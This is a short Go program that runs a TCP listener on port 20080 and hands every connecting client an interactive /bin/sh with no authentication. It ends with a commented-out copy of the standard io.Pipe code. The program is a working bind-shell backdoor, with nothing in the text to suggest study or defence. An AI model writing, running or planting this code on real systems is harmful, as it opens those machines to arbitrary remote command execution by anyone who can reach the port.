package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn

	cmd.Stdout = wp

	go io.Copy(conn, rp)

	cmd.Run()

	conn.Close()
}

func main() {
	liser, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatal(err)
	}

	log.Println("listen tcp :20080 ok")

	for {
		conn, err := liser.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go handle(conn)
	}
}

/*
func Pipe() (*PipeReader, *PipeWriter) {
	p := &pipe{
		wrCh: make(chan []byte),
		rdCh: make(chan int),
		done: make(chan struct{}),
	}
	return &PipeReader{p}, &PipeWriter{p}
}
*/
